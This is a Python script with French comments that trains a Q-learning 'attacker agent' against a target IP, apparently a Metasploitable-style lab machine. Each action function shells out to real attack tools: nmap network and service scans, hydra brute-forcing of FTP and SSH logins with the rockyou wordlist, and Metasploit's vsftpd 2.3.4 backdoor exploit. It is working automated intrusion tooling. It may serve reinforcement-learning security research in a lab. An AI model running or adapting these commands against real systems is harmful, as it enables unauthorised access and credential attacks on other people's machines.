# agent_attaquant.py
import os
import random
import numpy as np
import time

# Paramètres du Q-Learning
alpha = 0.1     # Taux d'apprentissage
gamma = 0.9     # Facteur de discount
epsilon = 0.3   # Exploration vs exploitation

# Actions possibles
actions = ["scan_reseau", "scan_ports", "bruteforce_ftp", "bruteforce_ssh", "exploit_vsftpd"]
q_table = {}

# IP cible
target_ip = "172.30.0.3"

def choose_action(state):
    if random.uniform(0, 1) < epsilon:
        return random.choice(actions)
    else:
        if state in q_table:
            return max(q_table[state], key=q_table[state].get)
        else:
            return random.choice(actions)

def update_q_table(state, action, reward, next_state):
    if state not in q_table:
        q_table[state] = {a: 0 for a in actions}
    if next_state not in q_table:
        q_table[next_state] = {a: 0 for a in actions}
    q_table[state][action] += alpha * (reward + gamma * max(q_table[next_state].values()) - q_table[state][action])

# Fonctions d'actions
def scan_reseau():
    os.system(f"nmap -sn 172.30.0.0/24")
    return 1

def scan_ports():
    os.system(f"nmap -sV -T4 {target_ip}")
    return 1

def bruteforce_ftp():
    result = os.system(f"hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{target_ip} -f -t 4")
    return 1 if result == 0 else -1

def bruteforce_ssh():
    result = os.system(f"hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -f -t 4")
    return 1 if result == 0 else -1

def exploit_vsftpd():
    cmd = f'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target_ip}; run; exit"'
    result = os.system(cmd)
    return 1 if result == 0 else -1

action_functions = {
    "scan_reseau": scan_reseau,
    "scan_ports": scan_ports,
    "bruteforce_ftp": bruteforce_ftp,
    "bruteforce_ssh": bruteforce_ssh,
    "exploit_vsftpd": exploit_vsftpd
}

# Boucle principale d'entraînement
for episode in range(10):  # Modifier pour + d'épisodes
    state = "start"
    print(f"--- Épisode {episode+1} ---")
    for step in range(5):  # Chaque épisode a 5 actions max
        action = choose_action(state)
        print(f"[Action choisie] : {action}")
        reward = action_functions[action]()
        next_state = "next"
        update_q_table(state, action, reward, next_state)
        state = next_state
        time.sleep(2)
